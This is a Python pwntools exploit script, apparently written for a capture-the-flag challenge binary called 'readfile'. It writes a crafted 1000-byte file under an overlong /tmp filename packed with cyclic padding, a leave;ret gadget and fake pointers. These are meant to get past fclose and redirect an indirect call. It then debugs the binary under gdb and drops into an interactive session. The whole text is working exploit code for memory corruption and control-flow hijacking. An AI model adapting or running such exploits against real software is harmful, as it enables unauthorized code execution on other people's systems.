from pwn import *
import string

# context.terminal = ['tmux', 'splitw', '-h']

elf = ELF('readfile')
rop = ROP(elf)
stager = ROP(elf)

r = None

def write_file(name, data):
    r.sendline('1')
    r.sendline(name)
    r.sendline(str(len(data)))
    r.sendline(data)

def read_file(name):
    r.sendline('2')
    r.sendline(name)

leaveret = 0x80486f1

data = p32(leaveret)

data2 = 'c' * cyclic_find('aaca')
data2 += p32(0x04a0f000)
data2 += '\x08' * (cyclic_find('ARAA', alphabet=string.ascii_uppercase) - 4 - len(data2))
data += data2

data += p32(0x804af00)      # 2) Some valid address to pass fclose
data += p32(0x804a0a5-0x3c) # 3) Address we will be calling at instruction call [eax + 0x3c]
data += cyclic(240-len(data), alphabet=string.ascii_uppercase)
filename = '/tmp/' + data
print(filename)
try:
    os.remove(filename)
except:
    pass

r = process("./readfile")

data = 'a' * cyclic_find('paac')
data += p32(0x804a0a0) # 1) Some valid address to pass fclose
data += 'b' * (1000 - len(data))
write_file(filename, data)

r = process("./readfile")
gdb.attach(r, '''
break *{}
break *0x0804890a
c
'''.format(hex(leaveret)))
read_file(filename)

r.interactive()
